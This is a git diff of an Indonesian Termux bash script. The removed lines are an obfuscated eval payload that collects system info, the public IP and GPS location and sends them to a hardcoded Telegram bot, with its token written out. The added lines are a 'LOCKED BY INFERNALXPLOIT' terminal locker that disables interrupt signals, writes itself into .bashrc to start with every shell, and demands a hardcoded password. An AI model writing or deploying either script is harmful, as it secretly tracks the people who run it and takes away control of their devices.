@@ -1,3 +1,48 @@
-z="
-";iz='t ID';fEz=' LOG';JEz='▀▀▀▀';GDz='&loc';uEz='====';lCz='url ';XCz='" | ';EEz='──▄▄';nBz='PS a';SDz='tele';VFz='loka';dz='  # ';IFz='== *';qFz='mua ';tFz='u in';wEz='🌐 :';UCz='LONG';ICz=' | g';WCz='E=$(';oz='ch -';tCz='a/re';Cz='N="7';dDz='hat_';hEz='I TO';VDz='/bot';aDz='essa';eBz='Gaga';sBz='memi';NBz='-p g';cFz='kiri';LDz='city';LEz='█░░╦';OBz='ps -';jFz='al d';Wz='a';nz='ofet';dEz='ADA ';uCz='vers';ZCz=' -o ';gDz='T_ID';sz='IC_I';fBz='l me';vCz='e-ge';CFz=' $CI';jDz='t="';lz='NFO=';DDz='UDE&';sCz='/dat';JBz='term';yDz='█───';dFz='m ke';MEz='─╦╔╗';qEz='STEM';wz='http';rBz='mux ';lEz='RENX';ACz='LATI';mDz='▄▄▄▄';kEz='ANG ';UBz='OCAT';lDz='▀▀▄▄';oBz='ktif';CEz='░▀█▀';ODz='onse';ECz='"$LO';IBz='A=$(';DCz='cho ';gFz='m."';OCz='^,]*';EDz='long';Lz='W32g';VEz='║╠─░';nFz='legr';iCz='-f2)';kBz='. Pa';CCz='=$(e';sFz=' kam';WBz='DATA';nEz='T';TCz='2)';oEz='📱 :';PFz=' "In';KBz='ux-l';TFz='em, ';oFz='am."';bFz='l di';PEz='╗╔╗░';EGz='eleg';Jz='rgT-';ZFz=' ber';aEz='╩╚╝░';hBz='atka';bCz='ngit';iFz=' gag';xCz='e-cl';rEz='_INF';ZEz='╚╝╩─';Yz='_ID=';xBz=' 1';XBz='" ]]';SBz='[ -z';LFz='ue'\''*';qz='out)';cCz='ude"';bBz=' "$(';cBz='date';Tz='oken';VBz='ION_';BBz='o | ';pEz=' $SY';yBz='fi';pBz=' dan';TEz='║─║─';BEz='─█░░';tBz='liki';mz='$(ne';jBz='kasi';QEz='░█';bEz='█▄▄▄';pDz='───█';gz='ngan';kDz='──▄▀';cEz='▄█';ZBz='en';Kz='Fv8g';TBz=' "$L';uz='curl';lBz='stik';mFz='e Te';tDz='▒█──';xDz='░█░░';rCz='.net';uBz=' izi';NCz='e":[';KCz='-o '\''';RFz='asi ';ZDz='endM';FEz='─▀▄░';JFz=''\''"ok';YCz='grep';EBz='ip'\'')';vFz='an b';ABz='fo.i';eFz=' Tel';qBz=' Ter';GFz='espo';Fz='8:AA';HEz='█';mEz='PLOI';yz='ipin';fz='i de';Bz='TOKE';XDz='_TOK';BGz='diki';GCz='ON_D';UFz='IP, ';MCz='itud';SEz='║║╠─';xFz='sil ';HCz='ATA"';kz='EM_I';RCz='-d'\'':';Mz='0s4J';uDz='─';OFz='n';ADz='?lat';UDz='.org';AFz='_IP';RDz='ST "';YBz='; th';YDz='EN/s';jz='SYST';uFz='gink';YEz='╚╝╚╝';nDz='▄▀▀▀';MFz=' ]];';Gz='F_X7';TDz='gram';Oz='k"  ';eEz='YANG';HDz='alit';DBz='r '\''.';DGz='ke T';Vz=' And';MDz=''\'')';aFz='hasi';az='0846';Xz='CHAT';pFz=' "Se';bz='619"';oCz='bigd';HBz='_DAT';QDz='X PO';KFz='":tr';Dz='7346';Ez='7202';HFz='nse ';xz='s://';AGz='lin ';LBz='ocat';hDz='" -d';mBz='an G';vDz='────';Pz='# Ga';sDz='░░░▒';GBz='TION';Iz='dRKU';gCz='t -d';oDz='▄───';fFz='egra';lFz='im k';vEz='==="';gBz='ndap';SCz=''\'' -f';nCz='api.';kFz='ikir';JCz='rep ';IDz='yLan';QFz='form';UEz='║║║║';mCz='-s "';GGz='"';jCz='CITY';PDz='-s -';Az='BOT_';YFz='kota';wBz='exit';vBz='."';tEz='"===';BCz='TUDE';qDz='▒▒░░';rDz='░░░░';iBz='n lo';CGz='rim ';CDz='ATIT';fCz='| cu';SFz='sist';NFz=' the';eCz=']*'\'' ';KEz='▀█';eDz='id="';yEz='BLIC';Hz='Dvff';cDz='-d c';WEz='█░░╚';fDz='$CHA';LCz='"lat';QBz=')';CBz='jq -';XFz='dan ';BFz='📍 :';iDz=' tex';pz='-std';EFz='")';rFz='yang';REz='█░░║';pCz='atac';iEz='OLS ';MBz='ion ';tz='P=$(';VCz='ITUD';Uz=' bot';IEz='█▀▀▀';qCz='loud';jEz='MU B';GEz='░░▄▀';Sz='an t';rz='PUBL';hFz='else';JDz='guag';yFz='disa';KDz='e=en';aCz=''\''"lo';XEz='╩╝╚╝';Rz='deng';WDz='$BOT';BDz='e=$L';xEz=' $PU';dBz=') - ';AEz='─▄▄─';RBz='if [';vz=' -s ';gEz='IN D';FBz='LOCA';PCz=''\'' | ';Qz='nti ';PBz='r 60';DEz='░░░█';WFz='si, ';Nz='kfAr';hz=' cha';wFz='erha';sEz='O';DFz='TY';yCz='ient';FCz='CATI';ez='Gant';kCz='=$(c';cz='    ';hCz=''\'':'\'' ';QCz='cut ';wDz='█░░█';Zz='"772';NEz='╦─╔╗';wCz='ocod';FFz='[ $r';bDz='ge" ';FGz='ram.';NDz='resp';OEz='╔╗╔╦';aBz='echo';dCz=':[^,';FDz='ONGI';
-eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$z$Xz$Yz$Zz$az$bz$cz$dz$ez$fz$gz$hz$iz$Vz$Wz$z$jz$kz$lz$mz$nz$oz$pz$qz$z$rz$sz$tz$uz$vz$wz$xz$yz$ABz$BBz$CBz$DBz$EBz$z$FBz$GBz$HBz$IBz$JBz$KBz$LBz$MBz$NBz$OBz$PBz$QBz$z$RBz$SBz$TBz$UBz$VBz$WBz$XBz$YBz$ZBz$z$aBz$bBz$cBz$dBz$eBz$fBz$gBz$hBz$iBz$jBz$kBz$lBz$mBz$nBz$oBz$pBz$qBz$rBz$sBz$tBz$uBz$iBz$jBz$vBz$z$wBz$xBz$z$yBz$z$ACz$BCz$CCz$DCz$ECz$FCz$GCz$HCz$ICz$JCz$KCz$LCz$MCz$NCz$OCz$PCz$QCz$RCz$SCz$TCz$z$UCz$VCz$WCz$aBz$TBz$UBz$VBz$WBz$XCz$YCz$ZCz$aCz$bCz$cCz$dCz$eCz$fCz$gCz$hCz$iCz$z$jCz$kCz$lCz$mCz$wz$xz$nCz$oCz$pCz$qCz$rCz$sCz$tCz$uCz$vCz$wCz$xCz$yCz$ADz$MCz$BDz$CDz$DDz$EDz$MCz$BDz$FDz$BCz$GDz$HDz$IDz$JDz$KDz$XCz$CBz$DBz$LDz$MDz$z$NDz$ODz$kCz$lCz$PDz$QDz$RDz$wz$xz$nCz$SDz$TDz$UDz$VDz$WDz$XDz$YDz$ZDz$aDz$bDz$cDz$dDz$eDz$fDz$gDz$hDz$iDz$jDz$z$kDz$lDz$mDz$nDz$oDz$z$pDz$qDz$rDz$sDz$tDz$uDz$z$vDz$wDz$rDz$xDz$yDz$uDz$z$AEz$BEz$CEz$DEz$EEz$uDz$z$wDz$FEz$rDz$GEz$BEz$HEz$z$IEz$JEz$JEz$JEz$JEz$KEz$z$LEz$MEz$NEz$OEz$PEz$QEz$z$REz$SEz$TEz$UEz$VEz$QEz$z$WEz$XEz$YEz$ZEz$aEz$QEz$z$bEz$mDz$mDz$mDz$mDz$cEz$z$dEz$eEz$fEz$gEz$hEz$iEz$jEz$kEz$lEz$mEz$nEz$z$oEz$pEz$qEz$rEz$sEz$z$tEz$uEz$uEz$uEz$uEz$uEz$vEz$z$wEz$xEz$yEz$AFz$z$BFz$CFz$DFz$z$EFz$z$RBz$FFz$GFz$HFz$IFz$JFz$KFz$LFz$MFz$NFz$OFz$z$aBz$PFz$QFz$RFz$SFz$TFz$UFz$VFz$WFz$XFz$YFz$ZFz$aFz$bFz$cFz$dFz$eFz$fFz$gFz$z$hFz$z$aBz$PFz$QFz$RFz$SFz$TFz$UFz$VFz$WFz$XFz$YFz$iFz$jFz$kFz$lFz$mFz$nFz$oFz$z$yBz$z$aBz$pFz$qFz$rFz$sFz$tFz$uFz$vFz$wFz$xFz$yFz$AGz$XFz$BGz$CGz$DGz$EGz$FGz$GGz"
+#!/bin/bash
+
+LOCK_FILE="$HOME/.termux_lock"
+PASSWORD="infernalxploit" # Ganti dengan password kamu
+SCRIPT_PATH="$HOME/lock.sh" # Path script ini
+
+# Matikan fungsi CTRL+C, CTRL+Z, dan keluar paksa
+trap '' SIGINT SIGTSTP SIGQUIT SIGTERM
+
+# Tambahkan auto-start ke .bashrc kalau belum ada
+if ! grep -q "$SCRIPT_PATH" "$HOME/.bashrc"; then
+    echo "bash $SCRIPT_PATH" >> "$HOME/.bashrc"
+fi
+
+# Kalau password sudah benar sebelumnya, hapus auto-start & lanjut ke Termux normal
+if [ -f "$LOCK_FILE" ]; then
+    sed -i "/bash $SCRIPT_PATH/d" "$HOME/.bashrc" # Hapus dari auto-start
+    rm -f "$LOCK_FILE" # Hapus lock file
+    exit 0
+fi
+
+# Banner Keren
+clear
+echo -e "\033[1;31m████████╗███████╗██████╗ ███╗   ██╗███╗   ██╗██╗  ██╗\033[0m"
+echo -e "\033[1;31m╚══██╔══╝██╔════╝██╔══██╗████╗  ██║████╗  ██║██║ ██╔╝\033[0m"
+echo -e "\033[1;31m   ██║   █████╗  ██████╔╝██╔██╗ ██║██╔██╗ ██║█████╔╝ \033[0m"
+echo -e "\033[1;31m   ██║   ██╔══╝  ██╔══██╗██║╚██╗██║██║╚██╗██║██╔═██╗ \033[0m"
+echo -e "\033[1;31m   ██║   ███████╗██║  ██║██║ ╚████║██║ ╚████║██║  ██╗\033[0m"
+echo -e "\033[1;31m   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚═╝  ╚═╝\033[0m"
+echo -e "\033[1;34m   [ LOCKED BY INFERNALXPLOIT ]\033[0m"
+echo ""
+
+# Minta password sampai benar
+while true; do
+    echo -n -e "\033[1;32m[+] Masukkan Password: \033[0m"
+    read -s input
+    echo ""
+
+    if [ "$input" == "$PASSWORD" ]; then
+        touch "$LOCK_FILE"
+        echo -e "\033[1;36m[✔] Akses Diterima, Selamat Datang!\033[0m"
+        sleep 2
+        break
+    else
+        echo -e "\033[1;31m[✘] Password salah! Coba lagi.\033[0m"
+        sleep 2
+    fi
+done
